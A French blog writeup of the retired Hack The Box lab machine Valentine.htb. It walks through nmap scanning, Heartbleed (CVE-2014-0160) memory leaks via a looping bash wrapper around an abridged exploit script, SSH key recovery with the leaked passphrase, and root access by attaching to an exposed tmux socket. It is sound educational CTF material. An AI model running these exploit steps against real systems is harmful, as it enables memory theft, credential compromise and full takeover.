---
title: "Valentine.htb"
date: 2025-08-04
draft: false
ShowToc: true
TocOpen: true
tags: ["HTB", "writeup", "CTF", "Heartbleed", "Tmux", "Linux"]
categories: ["Mes writeups"]
cover:
  image: "image.png"
  anchor: "top" # "center", "top", "left", "TopRight" ...
summary: >-
  Après une courte phase de repérage, un indice visuel saute aux yeux : une
  image de cœur brisé, clin d’œil à « Heartbleed », une faille OpenSSL très
  répandue à l’époque. En suivant cette piste, j’exploite la vulnérabilité pour
  récupérer des informations sensibles qui me donnent un accès utilisateur
  légitime à la machine. La suite se joue en local : un outil d’écran partagé
  (tmux), laissé insuffisamment protégé par l’admin, me permet de m’accrocher à
  sa session et d’obtenir les pleins pouvoirs (root), simplement et proprement.
  Le writeup retrace ce cheminement pas à pas — de l’indice visuel aux
  vérifications finales — et montre comment appliquer la même méthode sur
  d’autres machines.
description: "Exploitation de « Heartbleed », une faille OpenSSL très répandue à l’époque"
---

## Introduction
Writeup complet de la machine Valentine.htb (retired), incluant Heartbleed, extraction de clé SSH et escalade de privilèges via tmux

---

##  Énumération

### Scan initial

#### Services détectés
1. **22/tcp  open  ssh      OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)**

2. **80/tcp  open  http     Apache httpd 2.2.22 ((Ubuntu))**
   → http-title: Site doesn't have a title (text/html).  
   → http-server-header: Apache/2.2.22 (Ubuntu)  

3. **443/tcp open  ssl/http Apache httpd 2.2.22**
   → http-title: Site doesn't have a title (text/html).  
   → http-server-header: Apache/2.2.22 (Ubuntu)  
   → ssl-cert CN: valentine.htb  

#### OS détecté
`Linux 2.6.32 - 3.10, Linux 2.6.32 - 3.13`

#### UDP
*(aucun port `open` strict détecté ; scan top 20)*

#### Vue synthétique
- **TCP ouverts :** `22,80,443`
- **UDP ouverts :** *(aucun open strict)*

### Vulnérabilités HIGH (résumé)
1. **Vulnérabilité détectée** — *HIGH* (count: `4`)
   - Evidence: `      64-bit block cipher 3DES vulnerable to SWEET32 attack`
   - Ports: `443`
   - Sources: `4-nse-ssl.txt`

1. **Vulnérabilité détectée** — *HIGH* (count: `1`)
   - Evidence: `      OpenSSL versions 1.0.1 and 1.0.2-beta releases (including 1.0.1f and 1.0.2-beta1) of OpenSSL are affected by the Heartbleed bug. The bug allows for reading memory of systems protected by the vulnerable OpenSSL versions and could allow for disclosure of otherwise encrypted confidential information as well as the encryption keys themselves.`
   - Ports: `443`
   - Sources: `4-nse-ssl.txt`



Le site web révèle une interface avec des champs `encode`/`decode`, probablement base64.

```bash
curl http://valentine.htb
```

La page `/dev` contient deux fichiers intéressants :

- `hype_key`
- `notes.txt`

### Analyse initiale

Le fichier `notes.txt` donne un indice sur l’encodeur/décodeur :

> Don't use the decoder/encoder until any of this is done.

Cela laisse penser que des failles côté client sont en jeu, mais sans encoder JS actif, rien d’immédiat.

Le fichier `hype_key` semble être un dump hexadécimal d'une clé SSH privée (confirmé par `file`).

```bash
file hype_key
# ASCII text, with very long lines
```

Contenu analysé : ce n’est pas une image, ni du base64. Probablement une clé SSH.

---

## Exploitation - Prise Pied

### Heartbleed (CVE-2014-0160)
Le port 443 est actif, et un scan `nmap` confirme la vulnérabilité Heartbleed :

```bash
nmap -p 443 --script ssl-heartbleed valentine.htb
```

Résultat :

```
State: VULNERABLE
Risk factor: High
```

###  Script utilisé : `heartbleed_full.sh`

```bash
#!/bin/bash
# Usage: ./heartbleed_full.sh
# Ce script exécute plusieurs fois l’exploit Heartbleed et extrait les chaînes ASCII

read -p "🔢 Nombre d'itérations Heartbleed à exécuter : " count
mkdir -p dumps
rm -f dumps/out_*.txt ascii_concatenated.txt

for i in $(seq -f "%03g" 1 $count); do
    echo "➡️  [Iteration $i]..."
    python2 heartbleed-exploit.py valentine.htb --output dumps/out_$i.txt --ascii
done

echo -e "
🧪 Extraction des chaînes ASCII avec strings..."
strings dumps/out_*.txt | grep -E '[[:print:]]{4,}' | sort -u > ascii_concatenated.txt
echo -e "
✅ Terminé : toutes les chaînes ASCII concaténées dans ascii_concatenated.txt"
```

### Script Python : `heartbleed-exploit.py`

```python
#!/usr/bin/python
# -*- coding: utf-8 -*-
# Heartbleed exploit par Martial Puygrenier adapté pour extraire ASCII

# (… contenu abrégé, voir pièce jointe pour le fichier complet …)
```

Exécution du script :

```bash
./heartbleed_full.sh
```

Résultat : dans `ascii_concatenated.txt`, on récupère :

```
heartbleedbelievethehype
```

Mot de passe pour la clé SSH.

---

### Clé SSH — Récupération

Convertir le fichier `hype_key` en binaire :

```bash
xxd -r -p hype_key hype_key.pem
```

Déchiffrer avec OpenSSL :

```bash
openssl rsa -in hype_key.pem -out hype_key_decrypted.pem
```

Utilisation :

```bash
ssh -i hype_key_decrypted.pem hype@valentine.htb
```

---

## Escalade de privilèges

Après avoir obtenu un shell SSH en tant que l’utilisateur `hype`, j’ai lancé un classique :

```bash
linpeas.sh
```

💡 **LinPEAS** a mis en évidence la présence d’un processus tmux tournant en tant que root, avec cette ligne intrigante :

```bash
root   1040  0.0  0.1  26416  1672 ?  Ss  01:24   0:00 /usr/bin/tmux -S /.devs/dev_sess
```

### Analyse

Le socket tmux (`-S /.devs/dev_sess`) est accessible (lecture/exécution) par l’utilisateur `hype`.

Le processus appartient à `root`, ce qui signifie que la session associée pourrait être `root` attachée !

### Tentatives manuelles

Liste des sessions disponibles :

```bash
tmux -S /.devs/dev_sess ls
```

Connexion à la session existante :

```bash
tmux -S /.devs/dev_sess attach
```

###  Et là, bingo !

J’ai accédé à une session interactive **root** encore ouverte. Probablement laissée là par un admin négligent, ou par un script de debug.

###  Preuve

```bash
root@Valentine:/# id
uid=0(root) gid=0(root) groups=0(root)
```



## Les Flags

```bash
cat /home/hype/user.txt
cat /root/root.txt
```

---

## Pièces jointes

- [heartbleed_full.sh](files/heartbleed_full.sh)
- [heartbleed-exploit.py](files/heartbleed-exploit.py)

##  Conclusion

Cette machine montre l’impact réel d’une vulnérabilité critique comme Heartbleed. Avec un peu de persévérance, on remonte jusqu’à une clé SSH, puis une élévation de privilèges via une session `tmux` oubliée.

---

{{< admonition type="tip" title="Astuce" >}}
Toujours vérifier tous les couples `user:pass` en SSH, même s’ils semblent destinés au web.
{{< /admonition >}}

{{< admonition type="warning" title="Tri des dumps" >}}
Garde un fichier concaténé `strings | sort -u` + horodatage pour la reproductibilité.
{{< /admonition >}}

